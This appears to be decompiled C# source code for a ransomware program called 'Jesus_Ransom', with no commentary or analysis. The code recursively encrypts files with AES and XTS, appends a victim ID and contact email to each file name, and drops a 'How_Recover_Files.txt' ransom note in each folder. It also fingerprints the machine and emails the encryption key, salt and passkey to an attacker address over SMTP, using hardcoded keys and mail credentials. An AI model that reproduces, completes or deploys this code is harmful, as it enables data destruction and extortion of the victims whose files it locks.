using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Jesus_Ransom.Properties;

namespace Jesus_Ransom;

public class App : ApplicationContext
{
	private readonly Encoding Encoding = Encoding.UTF8;

	private readonly string[] EncryptedFileExtention = new string[2] { "JesusCryptA", "JesusCryptB" };

	private readonly string[] Emails_Addresses = null;

	private readonly string[] SizeSuffixes = new string[9] { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };

	private readonly DateTime Expiration;

	private string Instruction_file = null;

	private string Hta_File = null;

	private string[] serverDetails = null;

	private string passkey = string.Empty;

	private byte[] Key = null;

	private byte[] Salt = null;

	public App(string[] args)
	{
		if (args.Count() > 0)
		{
			byte[] inpute = File.ReadAllBytes(args[0]);
			byte[] bytes = AES.Decrypt(Xts.Decrypt(inpute, Encoding.GetBytes("rU?C2C?9t+rgqxQh"), Encoding.GetBytes("tJ+$ra4-7P=f5*xg")), Encoding.GetBytes("dv^6xM?Uc!EXK63!"), Encoding.GetBytes("y2@X7kVH^XXHH+w_"));
			string @string = Encoding.GetString(bytes);
			if (@string.Contains("JesusCrypt"))
			{
				using RegEdit regEdit = new RegEdit();
				regEdit.HKEY = HKEY.CurrentUser;
				regEdit.Address = "Software";
				Emails_Addresses = GetMails(@string);
				Expiration = GetDateTime(@string);
				Instruction_file = Resources.instructions.Replace("[EMAIL1]", Emails_Addresses[0]).Replace("[EMAIL2]", Emails_Addresses[1]).Replace("[SYSID]", UniqueID());
				Hta_File = Resources.info.Replace("[EMAIL1]", Emails_Addresses[0]).Replace("[EMAIL2]", Emails_Addresses[1]).Replace("[SYSID]", UniqueID());
				passkey = PasswordGenerator(10);
				Key = KeyGenerator(100);
				Salt = KeyGenerator(16);
				SetServerDetails("eiklot@hi2.in");
				encryptDirectory("D:\\test");
			}
		}
		Environment.Exit(0);
	}

	private string[] GetMails(string text)
	{
		List<string> list = new List<string>();
		string value = Regex.Match(text, "Mail=(.*?);").Groups[1].Value;
		list.AddRange(value.Split(new char[1] { ',' }));
		return list.ToArray();
	}

	private DateTime GetDateTime(string text)
	{
		string value = Regex.Match(text, "Time=(.*?);").Groups[1].Value;
		return DateTime.Parse(value);
	}

	private void encryptDirectory(string location)
	{
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		for (int i = 0; i < files.Length; i++)
		{
			Path.GetExtension(files[i]);
			EncryptFile(files[i]);
		}
		for (int j = 0; j < directories.Length; j++)
		{
			encryptDirectory(directories[j]);
		}
	}

	private bool NecessaryToEncrypt(string folder_path)
	{
		if (folder_path.Equals($"{folder_path.Split(new char[1] { ':' })[0]}:\\$RECYCLE.BIN"))
		{
			return false;
		}
		if (folder_path.Equals($"{folder_path.Split(new char[1] { ':' })[0]}:\\$Recycle.Bin"))
		{
			return false;
		}
		if (folder_path.Equals($"{Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))}Documents and Settings"))
		{
			return false;
		}
		if (folder_path.Equals($"{Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))}Windows"))
		{
			return false;
		}
		if (folder_path.Equals($"{folder_path.Split(new char[1] { ':' })[0]}:\\System Volume Information"))
		{
			return false;
		}
		return true;
	}

	private void SearchDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					EncryptFile(files[i]);
				}
				catch
				{
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				SearchDirectory(directories[j]);
			}
		}
		catch
		{
		}
	}

	private void EncryptFile(string FilePath)
	{
		try
		{
			if (!File.Exists(Path.GetDirectoryName(FilePath) + "\\How_Recover_Files.txt"))
			{
				File.WriteAllText(Path.GetDirectoryName(FilePath) + "\\How_Recover_Files.txt", Instruction_file);
			}
		}
		catch
		{
		}
		long length = new FileInfo(FilePath).Length;
		if (length >= 16L)
		{
			int count = Part(length);
			byte[] inpute = RAWFiles.ReadFile(FilePath, count);
			byte[] bytes = Xts.Encrypt(inpute, Key, Salt);
			RAWFiles.WriteFile(FilePath, bytes, append: true);
			RenameFile(FilePath, EncryptedFileExtention[0]);
		}
		else
		{
			byte[] bytesToBeEncrypted = RAWFiles.ReadFile(FilePath, Convert.ToInt32(length));
			byte[] inpute2 = AES.Encrypt(bytesToBeEncrypted, Key, Salt);
			byte[] bytes2 = Xts.Encrypt(inpute2, Key, Salt);
			RAWFiles.WriteFile(FilePath, bytes2, append: false);
			RenameFile(FilePath, EncryptedFileExtention[1]);
		}
	}

	private void RenameFile(string path, string extension)
	{
		File.Move(path, path + $".ID=[{UniqueID()}-{passkey}].Email=[{Emails_Addresses[0]}].{extension}");
	}

	private string Hash(byte[] key1, byte[] key2)
	{
		using HMACMD5 hMACMD = new HMACMD5(key1);
		byte[] array = hMACMD.ComputeHash(key2);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("x2"));
		}
		return stringBuilder.ToString();
	}

	private string UniqueID()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"" + Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))!.Remove(1, 2) + ":\"");
		val.Get();
		string text = ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		if (!string.IsNullOrEmpty(text))
		{
			return text;
		}
		ManagementObjectSearcher val2 = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
		string result = "";
		ManagementObjectEnumerator enumerator = val2.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				result = ((ManagementBaseObject)val3).get_Item("SerialNumber").ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return result;
	}

	private void SetServerDetails(string Email)
	{
		string[] array;
		try
		{
			array = new WebClient().DownloadString("http://ip-api.com/csv/?fields=country,query").Split(new char[1] { ',' });
		}
		catch
		{
			array = new string[2] { "N/A", "N/A" };
		}
		long num = 0L;
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.IsReady)
			{
				num += driveInfo.TotalSize - driveInfo.TotalFreeSpace;
			}
		}
		serverDetails = new string[9]
		{
			$"ID : {UniqueID()}",
			$"IP : {array[1]}",
			$"Country : {array[0]}",
			$"OS : {OsName()}",
			$"Machine Name : {Environment.MachineName}",
			$"Hard Used Space : {ParseByteInString(num)}",
			$"Pass Key : {passkey}",
			$"Key : {Convert.ToBase64String(Key)}",
			$"Salt : {Convert.ToBase64String(Salt)}"
		};
		SendEmail(Email);
	}

	private void SendEmail(string Email)
	{
		SmtpClient smtpClient = new SmtpClient("mail.cock.li")
		{
			Port = 587,
			Credentials = new NetworkCredential("SendServerInfo@hitler.rocks", "jesuscrypt"),
			EnableSsl = true
		};
		smtpClient.Send("SendServerInfo@hitler.rocks", Email, "New Victim - [" + UniqueID() + "]", EncryptStr(serverDetails[0] + Environment.NewLine + serverDetails[1] + Environment.NewLine + serverDetails[2] + Environment.NewLine + serverDetails[3] + Environment.NewLine + serverDetails[4] + Environment.NewLine + serverDetails[5] + Environment.NewLine + serverDetails[6] + Environment.NewLine + serverDetails[7]));
	}

	private void SendCompleted(string Email)
	{
		SmtpClient smtpClient = new SmtpClient("mail.cock.li")
		{
			Port = 587,
			Credentials = new NetworkCredential("SendServerInfo@hitler.rocks", "jesuscrypt"),
			EnableSsl = true
		};
		smtpClient.Send("SendServerInfo@hitler.rocks", Email, "Victim - [" + UniqueID() + "]", "Encryption Completed :)");
	}

	private string EncryptStr(string str)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(str);
		byte[] inArray = Xts.Encrypt(AES.Encrypt(bytes, Encoding.GetBytes("dv^6xM?Uc!EXK63!"), Encoding.GetBytes("y2@X7kVH^XXHH+w_")), Encoding.GetBytes("rU?C2C?9t+rgqxQh"), Encoding.GetBytes("tJ+$ra4-7P=f5*xg"));
		return Convert.ToBase64String(inArray);
	}

	private string OsName()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		string result = string.Empty;
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = ((ManagementBaseObject)val2).get_Item("Caption").ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return result;
	}

	private string ParseByteInString(long value, int decimalPlaces = 0)
	{
		int num = (int)Math.Max(0.0, Math.Log(value, 1024.0));
		double num2 = Math.Round((double)value / Math.Pow(1024.0, num), decimalPlaces);
		return $"{num2} {SizeSuffixes[num]}";
	}

	private static int Part(long length)
	{
		int num = 0;
		if (length > 90112L)
		{
			return 90112;
		}
		return Convert.ToInt32(length);
	}

	private byte[] KeyGenerator(int Byte)
	{
		byte[] array = new byte[Byte];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string PasswordGenerator(int length, string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append(valid[random.Next(valid.Length)]);
		}
		return stringBuilder.ToString();
	}
}
